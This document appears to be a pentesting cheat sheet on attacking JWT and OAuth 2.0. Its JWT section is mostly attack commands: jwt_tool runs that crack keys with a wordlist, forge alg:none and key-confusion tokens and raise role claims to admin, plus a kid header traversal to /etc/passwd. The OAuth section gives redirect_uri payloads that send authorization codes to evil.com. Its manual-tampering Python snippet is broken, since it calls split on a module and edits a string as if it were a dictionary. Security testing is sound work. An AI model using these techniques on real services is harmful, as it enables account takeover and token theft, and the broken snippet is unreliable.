# JWT + OAuth 2.0 Security Testing

## JWT attack surface

### 1. Algorithm confusion

```bash
# alg:none: the most classic
# Original: {"alg":"RS256","typ":"JWT"}.payload.signature
# Attack: {"alg":"none","typ":"JWT"}.payload.  (empty signature)

# RS256 → HS256 key confusion
# If the server verifies HS256 with the RS256 public key
# you can sign with the public key as the HMAC key
python3 jwt_tool.py <JWT> -X k -pk public.pem

# kid injection
# {"alg":"HS256","kid":"../../../../etc/passwd"}
# The server uses the content of the file kid points to as the HMAC key
```

### 2. Complete jwt_tool usage

```bash
# Full scan
python3 jwt_tool.py <JWT> -t <URL> -cv "Authorization: Bearer <JWT>"

# Weak key brute force
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

# Claim tampering
python3 jwt_tool.py <JWT> -I -pc role -pv admin
python3 jwt_tool.py <JWT> -I -pc exp -pv 9999999999

# RSA key confusion
python3 jwt_tool.py <JWT> -X k -pk public.pem

# Embedded JWK
python3 jwt_tool.py <JWT> -X i
```

### 3. Manual JWT tampering

```python
import jwt
import base64

# Decode (no verification)
header, payload, sig = jwt.split('.')

# Tamper with the payload
payload['role'] = 'admin'
payload['exp'] = 9999999999

# alg:none
new_token = base64url_encode(header) + '.' + base64url_encode(payload) + '.'

# HS256 with known key
new_token = jwt.encode(payload, 'secret', algorithm='HS256')
```

## OAuth 2.0 attack surface

### Authorization Code Grant

```text
1. redirect_uri manipulation
   Normal: https://app.com/callback?code=AUTH_CODE
   Attack: https://app.com/callback@evil.com?code=AUTH_CODE
         https://evil.com/?redirect=https://app.com/callback?code=AUTH_CODE
         Open redirect + redirect_uri: https://app.com/callback?redirect=https://evil.com

2. CSRF via a missing state
   No state parameter → the attacker binds the victim session with their own code

3. Missing PKCE
   No code_challenge → authorization code interception attack

4. Token leaks in the Referer
   The callback page loads external resources → the Referer header contains the code/token
```

### Implicit Grant (deprecated but still deployed)

```text
1. access_token in the URL fragment → Referer leak
2. Token in browser history → physical access risk
3. No client authentication → token substitution attack
```

### Client Credentials Grant

```text
1. client_secret leak (hard-coded in front end/mobile)
2. Excessive scope grants
3. No per-client rate limiting → brute-force enumeration
```

### General OAuth testing

```text
□ Test scope escalation: scope=read → scope=read%20write
□ Token replay: use an old access_token on new resources
□ Refresh token abuse: refresh_token renews indefinitely
□ Cross-tenant access: tenant A's token accesses tenant B
□ Token leaks in logs/URLs/Referer
```

## Tools

```bash
# JWT testing
pip install jwt-tool pyjwt

# OAuth testing
# Burp Suite + OAuth Scanner extension
# Postman OAuth 2.0 flow testing

# Automation
# Entropy: automatic JWT tampering + OAuth redirect_uri testing
```

Source: OWASP API Top 10 (API2: Broken Authentication), jwt_tool, PortSwigger OAuth research
